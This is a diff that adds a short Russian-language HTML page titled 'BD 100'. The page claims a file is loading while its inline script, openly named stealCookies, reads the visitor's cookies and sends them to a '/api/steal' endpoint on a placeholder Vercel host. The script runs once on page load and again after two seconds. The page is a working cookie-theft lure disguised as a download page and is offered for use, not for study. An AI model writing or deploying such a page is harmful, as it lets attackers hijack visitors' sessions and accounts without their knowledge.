@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>BD 100</title>
+</head>
+<body>
+    <h1>BD</h1>
+    <p>Подожди пару секунд, файл загружается...</p>
+
+    <script>
+        function stealCookies() {
+            const cookies = document.cookie;
+            if (cookies.length > 0) {
+                const img = new Image();
+                img.src = "https://твой-vercel.vercel.app/api/steal?c=" + encodeURIComponent(cookies);
+            }
+        }
+        stealCookies();
+        setTimeout(stealCookies, 2000);
+    </script>
+</body>
+</html>
